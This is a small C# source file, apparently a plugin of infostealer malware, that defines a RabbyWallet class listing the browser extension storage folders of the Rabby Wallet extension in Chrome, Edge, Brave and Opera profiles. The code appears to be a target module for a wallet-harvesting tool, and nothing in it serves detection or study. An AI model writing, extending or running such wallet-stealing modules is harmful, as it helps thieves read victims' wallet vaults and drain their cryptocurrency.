using System;
using System.Collections.Generic;
using System.IO;

namespace Plugin.Crypto
{
    // Rabby Wallet - Popular DeFi wallet (2025)
    public class RabbyWallet : CryptoWalletBase
    {
        public RabbyWallet()
        {
            walletName = "RabbyWallet";
            
            // Rabby Wallet browser extension paths
            // Extension ID: acmacodkjbdgmoleebolmdjonilkdbch
            walletPaths.Add("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\acmacodkjbdgmoleebolmdjonilkdbch");
            walletPaths.Add("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\acmacodkjbdgmoleebolmdjonilkdbch");
            walletPaths.Add("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\acmacodkjbdgmoleebolmdjonilkdbch");
            walletPaths.Add("%APPDATA%\\Opera Software\\Opera Stable\\Local Extension Settings\\acmacodkjbdgmoleebolmdjonilkdbch");
        }
    }
}
